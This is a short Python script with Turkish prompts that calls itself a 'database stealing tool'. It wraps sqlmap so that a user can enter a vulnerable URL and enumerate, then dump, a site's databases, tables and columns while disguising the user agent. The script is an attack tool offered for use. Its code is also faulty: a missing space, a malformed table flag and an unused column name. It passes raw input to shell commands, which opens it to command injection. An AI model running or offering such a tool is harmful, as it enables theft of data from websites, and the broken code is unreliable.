#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet REIN")
os.system("figlet VERI TABANI CALMA ARACI")

print("""
      
Veri Tabanı Calma Aracına Hoşgeldiniz...


1) Sadece Açıklı Linki Bİliyorum.
2) Açıklı Linki, Veritabanı Adını Biliyorum.
3) AÇıklı Linki, Veritabanı Adını, Tablo Adını Biliyorum.
4) Açıklı Linki, Veritabanı Adını, Tablo Adını, Kolon Adını Biliyorum.

""")

islemno=input("İşlem No Seçiniz : ")

if(islemno=="1"):
    aciklilink=input("Açıklı linki giriniz :")
    os.system("sqlmap -u "+aciklilink+" --dbs --random-agent")
elif(islemno=="2"):
	aciklilink=input("Açıklı linki giriniz :")
	veritabani=input("Veritabani adini giriniz :")
	os.system("sqlmap -u "+aciklilink+" -D "+veritabani+" --tables --random-agent")
elif(islemno=="3"):
	aciklilink=input("Açıklı linki giriniz :")
	veritabani=input("Veritabani adini giriniz :")
	tabloadi=input("Tablo adini giriniz :")
	os.system("sqlmap -u "+aciklilink+" -D "+veritabani+" -t "+tabloadi+"--columns --random-agent")
elif(islemno=="4"):
	aciklilink=input("Açıklı linki giriniz :")
	veritabani=input("Veritabani adini giriniz :")
	tabloadi=input("Tablo adini giriniz :")
	kolonadi=input("Kolon adi giriniz :")
	os.system("sqlmap -u "+aciklilink+" -D "+veritabani+" - "+tabloadi+" -C "+ " --dump --random-agent")
else:
	print("hatalı seçim yapıyorsun....")